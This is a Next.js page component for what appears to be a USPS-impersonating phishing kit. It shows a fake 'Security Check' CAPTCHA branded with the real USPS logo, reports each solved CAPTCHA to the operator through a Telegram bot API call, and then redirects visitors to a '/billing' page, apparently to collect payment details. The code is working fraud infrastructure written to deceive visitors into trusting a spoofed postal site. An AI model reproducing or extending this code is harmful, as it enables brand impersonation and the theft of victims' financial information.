'use client';
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from './lib/telegramConfig';

export default function USPSCaptchaPage() {
  const [captchaInput, setCaptchaInput] = useState('');
  const [captchaCode, setCaptchaCode] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCaptcha, setShowCaptcha] = useState(false);
  const router = useRouter();

  useEffect(() => {
    const newCode = generateCaptcha(6);
    setCaptchaCode(newCode);

    // Delay before showing the CAPTCHA
    const introTimer = setTimeout(() => {
      setShowCaptcha(true);
    }, 3000); // Show CAPTCHA after 3 seconds

    return () => clearTimeout(introTimer);
  }, []);

  const generateCaptcha = (length: number) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = 'USPS';
    for (let i = 0; i < length - 4; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(false);

    if (captchaInput.trim().toUpperCase() !== captchaCode.toUpperCase()) {
      setError('⚠️ CAPTCHA incorrect. Please try again.');
      return;
    }

    const message = `
✅ *USPS CAPTCHA Verified*
-----------------------------
🔐 CAPTCHA Code Entered: ${captchaInput}
🧩 Generated Code: ${captchaCode}
🕒 Time: ${new Date().toLocaleString()}
    `;

    try {
      setIsSubmitting(true);

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      });

      setTimeout(() => {
        router.push('/billing');
      }, 3000);
    } catch (err) {
      setIsSubmitting(false);
      setError('❌ Failed to send verification.');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-white to-gray-100 px-4 font-sans text-[#2C2A61]">
      <div className="w-full max-w-md bg-white p-8 rounded-xl shadow-lg border border-gray-200 text-center">
        <img
          src="https://reg.usps.com/entreg/assets/images/des_brd_2color_logo_274x79.png"
          alt="USPS Logo"
          className="w-48 mx-auto mb-6"
        />

        {!showCaptcha ? (
          <div className="flex flex-col items-center justify-center">
            <img
              src="https://i.gifer.com/7efs.gif"
              alt="Verifying animation"
              className="w-24 h-24 mb-4"
            />
            <p className="text-gray-600 text-sm">🔐 Preparing security check...</p>
          </div>
        ) : (
          <>
            <h1 className="text-2xl font-bold mb-4">Security Check</h1>
            <p className="text-sm mb-6">Please verify you're not a robot to continue.</p>

            {error && (
              <div className="bg-red-100 text-red-700 border border-red-400 px-4 py-3 text-sm rounded mb-4 text-center">
                {error}
              </div>
            )}

            {isSubmitting ? (
              <div className="flex flex-col items-center justify-center py-12">
                <img
                  src="https://i.gifer.com/ZZ5H.gif"
                  alt="Loading..."
                  className="w-20 h-20 mb-4"
                />
                <p className="text-sm text-gray-600">Please wait while we process your CAPTCHA verification...</p>
              </div>
            ) : (
              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="bg-[#f2f2f2] text-center py-4 rounded-md border border-gray-300">
                  <p className="text-sm mb-1">🔒 Enter the code below:</p>
                  <div className="text-xl font-mono font-bold tracking-widest text-[#2C2A61] select-none">
                    {captchaCode}
                  </div>
                </div>

                <input
                  type="text"
                  value={captchaInput}
                  onChange={(e) => setCaptchaInput(e.target.value)}
                  placeholder="Type the code shown above"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm text-center uppercase tracking-wider"
                  required
                />

                <button
                  type="submit"
                  className="w-full bg-[#2C2A61] hover:bg-[#1d1a45] text-white font-semibold py-3 rounded-lg shadow-md transition"
                >
                  Verify
                </button>
              </form>
            )}
          </>
        )}
      </div>
    </div>
  );
}
